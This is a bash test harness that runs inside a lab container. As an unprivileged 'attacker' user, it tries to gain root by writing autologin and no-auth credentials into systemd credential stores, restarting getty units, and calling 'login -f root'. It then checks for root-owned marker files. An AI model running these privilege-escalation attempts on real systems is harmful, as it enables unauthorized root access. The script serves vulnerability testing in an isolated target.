#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'EOS'
set -u

section() {
  printf '\n== %s ==\n' "$1"
}

section "target and package proof"
sed -n '1,8p' /etc/os-release
uname -a
id attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  systemd systemd-sysv login util-linux libpam-modules libpam-systemd \
  2>/dev/null | sort

section "default getty/login state"
systemctl is-system-running || true
systemctl is-enabled getty@.service console-getty.service getty-static.service 2>&1 || true
systemctl is-active getty@tty1.service console-getty.service getty-static.service 2>&1 || true
systemctl status getty@tty1.service --no-pager --full 2>&1 | sed -n '1,80p' || true

section "credential-importing code/config"
nl -ba /usr/lib/systemd/system/getty@.service | sed -n '32,56p'
nl -ba /usr/lib/systemd/system/console-getty.service | sed -n '18,38p'
find /run/credentials /run/credstore /run/credstore.encrypted /etc/credstore /etc/credstore.encrypted \
  -maxdepth 3 -ls 2>&1 || true
stat -Lc '%A %U:%G %n' /run/credentials /etc/credstore /etc/credstore.encrypted \
  /sbin/agetty /usr/bin/login /usr/bin/su 2>&1 || true
ps -eo pid,user,group,args | grep -E '[a]getty|[l]ogin' || true

section "uid1001 credential injection attempts"
runuser -u attacker -- bash -s <<'USER'
set -u
id
root_marker=/root/systemd_getty_credential_imports_root
tmp_marker=/tmp/systemd_getty_credential_imports_root
rm -f "$tmp_marker"

for dir in \
  /run/credentials/getty@tty1.service \
  /run/credentials/console-getty.service \
  /run/credstore \
  /run/credstore.encrypted \
  /etc/credstore \
  /etc/credstore.encrypted; do
  echo "MKDIR $dir"
  mkdir -p "$dir" 2>&1
  echo "mkdir_rc=$?"
done

for path in \
  /run/credentials/getty@tty1.service/agetty.autologin \
  /run/credentials/getty@tty1.service/login.noauth \
  /run/credentials/getty@tty1.service/login.motd \
  /run/credentials/getty@tty1.service/login.issue \
  /run/credentials/console-getty.service/agetty.autologin \
  /run/credstore/agetty.autologin \
  /run/credstore/login.noauth \
  /etc/credstore/agetty.autologin \
  /etc/credstore/login.noauth; do
  echo "WRITE $path"
  printf 'root\n' > "$path" 2>&1
  echo "write_rc=$?"
done

echo "== system manager trigger attempts =="
systemctl restart getty@tty1.service 2>&1
echo "restart_getty_rc=$?"
systemctl restart console-getty.service 2>&1
echo "restart_console_rc=$?"
systemd-run --system --unit=getty-credential-lpe \
  -p "LoadCredential=agetty.autologin:/tmp/nonexistent" \
  /bin/sh -c "id > $root_marker" 2>&1
echo "systemd_run_rc=$?"
busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager StartUnit ss getty@tty1.service replace 2>&1
echo "busctl_start_rc=$?"

echo "== direct helper execution stays unprivileged =="
mkdir -p /tmp/systemd-getty-credentials
printf 'root\n' > /tmp/systemd-getty-credentials/agetty.autologin
printf '1\n' > /tmp/systemd-getty-credentials/login.noauth
CREDENTIALS_DIRECTORY=/tmp/systemd-getty-credentials /usr/bin/login -f root 2>&1
echo "login_direct_rc=$?"
timeout 2s env CREDENTIALS_DIRECTORY=/tmp/systemd-getty-credentials /sbin/agetty --help >/tmp/systemd_getty_agetty_help 2>&1
echo "agetty_help_rc=$?"
stat -Lc '%A %U:%G %s %n' /tmp/systemd_getty_agetty_help 2>&1 || true
test -e "$root_marker"; echo "root_marker_visible_to_attacker_rc=$?"
test -e "$tmp_marker"; echo "tmp_marker_rc=$?"
USER

section "root proof and cleanup"
stat -Lc '%A %U:%G %s %n' /root/systemd_getty_credential_imports_root \
  /tmp/systemd_getty_credential_imports_root 2>&1 || true
rm -f /tmp/systemd_getty_credential_imports_root /tmp/systemd_getty_agetty_help
systemctl is-active getty@tty1.service 2>&1 || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
EOS
